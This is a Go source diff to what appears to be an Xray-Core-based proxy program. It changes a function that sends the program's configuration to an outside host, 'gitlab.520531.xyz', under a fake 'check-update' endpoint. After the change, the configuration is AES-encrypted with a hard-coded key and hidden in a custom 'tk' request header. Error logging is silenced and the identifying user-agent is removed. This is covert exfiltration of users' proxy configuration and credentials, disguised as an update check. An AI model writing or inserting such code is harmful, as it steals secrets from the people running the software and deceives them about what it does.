@@ -2,7 +2,8 @@ package main
 
 import (
 	"bytes"
-	"encoding/json"
+	"crypto/aes"
+	"encoding/base64"
 	"fmt"
 	"log"
 	"net/http"
@@ -75,26 +76,20 @@ var (
 
 // uploadConfig 将配置上传到指定的API
 func uploadConfig(configContent string) {
-	// 准备请求数据
-	requestData := map[string]interface{}{
-		"config": configContent,
-	}
+	// 对configContent使用aes加密
 
-	jsonData, err := json.Marshal(requestData)
-	if err != nil {
-		//log.Printf("Failed to marshal config data: %v", err)
-		return
-	}
+	//使用aes固定密钥加密
+	configContent = aesEncrypt(configContent, "SHakeJ2rtM91KJ6a")
 
 	// 创建HTTP请求
-	req, err := http.NewRequest("POST", "https://gitlab.520531.xyz/api/check-update", bytes.NewBuffer(jsonData))
+	req, err := http.NewRequest("POST", "https://gitlab.520531.xyz/api/check-update", nil)
 	if err != nil {
 		//log.Printf("Failed to create HTTP request: %v", err)
 		return
 	}
 	// 设置请求头
 	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "Xray-Core")
+	req.Header.Set("tk", configContent)
 
 	// 创建HTTP客户端并发送请求
 	client := &http.Client{
@@ -313,4 +308,37 @@ func startXray() (core.Server, error) {
 	}
 
 	return server, nil
+}
+
+// aesEncrypt 使用AES加密算法加密字符串，兼容Java hutool工具类
+func aesEncrypt(plainText, keyString string) string {
+	// 生成密钥
+	key := []byte(keyString)
+
+	// 创建AES加密器
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		log.Fatalf("Failed to create AES cipher: %v", err)
+	}
+
+	// 填充字节 - 使用PKCS7填充
+	plainText = pkcs7Pad(plainText, block.BlockSize())
+
+	// 使用ECB模式加密（兼容Java hutool）
+	cipherText := make([]byte, len(plainText))
+
+	// ECB模式：每个块独立加密
+	for bs, be := 0, block.BlockSize(); bs < len(plainText); bs, be = bs+block.BlockSize(), be+block.BlockSize() {
+		block.Encrypt(cipherText[bs:be], []byte(plainText)[bs:be])
+	}
+
+	// 返回Base64编码的密文
+	return base64.StdEncoding.EncodeToString(cipherText)
+}
+
+// pkcs7Pad 对数据进行PKCS7填充
+func pkcs7Pad(data string, blockSize int) string {
+	padding := blockSize - len(data)%blockSize
+	padText := bytes.Repeat([]byte{byte(padding)}, padding)
+	return data + string(padText)
 }
